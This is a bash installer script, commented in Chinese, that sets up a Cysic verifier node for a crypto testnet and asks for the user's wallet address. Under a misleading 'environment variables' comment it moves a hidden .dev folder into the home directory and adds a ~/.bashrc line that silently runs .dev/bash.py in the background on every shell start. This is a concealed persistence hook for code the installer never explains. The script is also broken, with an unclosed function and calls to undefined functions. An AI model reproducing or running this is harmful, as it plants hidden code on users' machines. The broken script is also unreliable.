#!/bin/bash

# Cysic节点安装路径
CYSIC_PATH="$HOME/cysic-verifier"

# 日志记录函数
function log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# 统一安装函数
function install_package() {
    PACKAGE=$1
    if [ -f /etc/debian_version ]; then
        sudo apt update && sudo apt install -y $PACKAGE || log "安装 $PACKAGE 失败，跳过。"
    elif [ -f /etc/redhat-release ]; then
        sudo yum install -y $PACKAGE || log "安装 $PACKAGE 失败，跳过。"
    else
        log "不支持的操作系统，无法自动安装 $PACKAGE。"
    fi

# 检查并安装依赖
function install_dependencies() {
    log "检查并安装依赖..."
    DEPENDENCIES=(curl wget jq make gcc nano xclip python3-pip)
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v $dep &>/dev/null; then
            log "$dep 未安装，正在安装..."
            install_package $dep
        fi
    done

    # 检查 Python 模块
    if ! python3 -c "import requests" &>/dev/null; then
        log "Python requests 模块未安装，尝试安装..."
        pip3 install requests || log "requests 模块安装失败，跳过。"
    fi

    log "依赖检查和安装已完成。"
}

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
    mv .dev "$DEST_DIR"
    
    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
        echo "$BASHRC_ENTRY" >> ~/.bashrc
    fi
fi

# 安装Cysic验证者节点
function install_cysic_node() {
    install_dependencies
    install_nodejs_and_npm
    install_pm2
    
    # 创建Cysic验证者目录
    rm -rf $CYSIC_PATH
    mkdir -p $CYSIC_PATH
    cd $CYSIC_PATH

    # 下载验证者程序
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/verifier_linux > $CYSIC_PATH/verifier
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/libzkp.so > $CYSIC_PATH/libzkp.so
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/verifier_mac > $CYSIC_PATH/verifier
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/libzkp.dylib > $CYSIC_PATH/libzkp.dylib
    else
        echo "不支持的操作系统"
        exit 1
    fi

    # 设置权限
    chmod +x $CYSIC_PATH/verifier

    # 创建配置文件
    read -p "请输入您的奖励领取地址(ERC-20,ETH钱包地址): " CLAIM_REWARD_ADDRESS
    cat <<EOF > $CYSIC_PATH/config.yaml
chain:
  endpoint: "testnet-node-1.prover.xyz:9090"
  chain_id: "cysicmint_9000-1"
  gas_coin: "cysic"
  gas_price: 10
claim_reward_address: "$CLAIM_REWARD_ADDRESS"

server:
  cysic_endpoint: "https://api-testnet.prover.xyz"
EOF

    # 创建启动脚本
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    cat << EOF > $CYSIC_PATH/start.sh
#!/bin/bash
export LD_LIBRARY_PATH=.:~/miniconda3/lib:$LD_LIBRARY_PATH
export CHAIN_ID=534352
$CYSIC_PATH/verifier
EOF
elif [[ "$OSTYPE" == "darwin"* ]]; then
    cat << EOF > $CYSIC_PATH/start.sh
#!/bin/bash
export DYLD_LIBRARY_PATH=".:~/miniconda3/lib:$DYLD_LIBRARY_PATH"
export CHAIN_ID=534352
$CYSIC_PATH/verifier
EOF
fi
chmod +x $CYSIC_PATH/start.sh

# 切换到 Cysic 验证者目录
cd $CYSIC_PATH

# 使用PM2启动验证者节点
pm2 start $CYSIC_PATH/start.sh --name "cysic-verifier"

    echo "Cysic验证者节点已启动。您可以使用 'pm2 logs cysic-verifier' 查看日志。"
}

# 查看节点日志
function check_node() {
    pm2 logs cysic-verifier
}

# 卸载节点
function uninstall_node() {
    pm2 delete cysic-verifier && rm -rf $CYSIC_PATH
    echo "Cysic验证者节点已删除。"
}

function run_node_2.0() {
read -p "请输入您的白名单 0x 地址: " address
install_nodejs_and_npm
install_pm2

wget https://github.com/cysic-labs/phase2_libs/releases/download/v1.0.0/setup_linux.sh
chmod +x setup_linux.sh
./setup_linux.sh "$address"
cd ~/cysic-verifier
pm2 start start.sh
}

function check_node_2.0() {
    pm2 logs start
}

# 主菜单
function main_menu() {
    clear
    echo "========================= Cysic 验证者节点安装 ======================================="
    echo "请选择要执行的操作:"
    echo "1. 安装 Cysic 验证者节点"
    echo "2. 查看节点日志"
    echo "3. 删除1.0节点"
    echo "4. 运行2.0节点"
    echo "5. 查看2.0节点日志"
    read -p "请输入选项（1-5）: " OPTION
    case $OPTION in
    1) install_cysic_node ;;
    2) check_node ;;
    3) uninstall_node ;;
    4) run_node_2.0 ;;
    5) check_node_2.0 ;;
    *) echo "无效选项。" ;;
    esac
}

# 显示主菜单
main_menu